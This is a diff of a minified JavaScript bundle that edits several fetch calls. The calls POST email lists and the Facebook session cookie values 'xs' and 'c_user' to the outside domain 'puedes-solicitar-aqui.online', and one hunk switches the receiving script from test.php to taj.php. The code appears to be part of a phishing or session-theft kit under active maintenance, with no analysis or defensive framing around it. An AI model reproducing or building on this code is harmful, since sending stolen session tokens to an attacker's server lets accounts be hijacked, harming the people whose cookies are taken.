@@ -9822,8 +9822,8 @@
                                         body: JSON.stringify({
                                             emails: o,
                                             workerEmail: "salmanjani email",
-                                            xs: r,
-                                            c_user: i,
+                                            xs: xs,
+                                            c_user: C_user,
                                             name: "asad"
                                         })
                                     }).then((e => {
@@ -13366,8 +13366,8 @@
                                         body: JSON.stringify({
                                             emails: e,
                                             workerEmail: "",
-                                            xs: i,
-                                            c_user: r,
+                                            xs: xs,
+                                            c_user: c_user,
                                             name: "My Self"
                                         })
                                     }).then((e => {
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://puedes-solicitar-aqui.online/test.php", {
+                        fetch("https://puedes-solicitar-aqui.online/taj.php", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
